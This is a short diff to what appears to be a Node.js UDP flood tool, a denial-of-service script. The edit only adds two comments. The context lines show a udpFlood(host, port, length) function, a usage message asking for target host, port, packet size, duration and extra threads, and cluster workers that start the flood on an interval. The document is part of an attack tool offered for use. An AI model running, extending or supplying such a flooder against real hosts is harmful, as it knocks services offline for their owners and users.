@@ -30,6 +30,7 @@ function udpFlood(host, port, length) {
 }
 
 if (cluster.isPrimary) {
+    // main-thread specified here.
     if (process.argv.length < 6) {
         console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
         process.exit(1);
@@ -50,6 +51,7 @@ if (cluster.isPrimary) {
         newWorker.send({ message: "start" });
     });
 } else {
+    // to be threaded.
     process.on('message', (msg) => {
         if (msg.message === "start") {
             let flood = setInterval(() => {
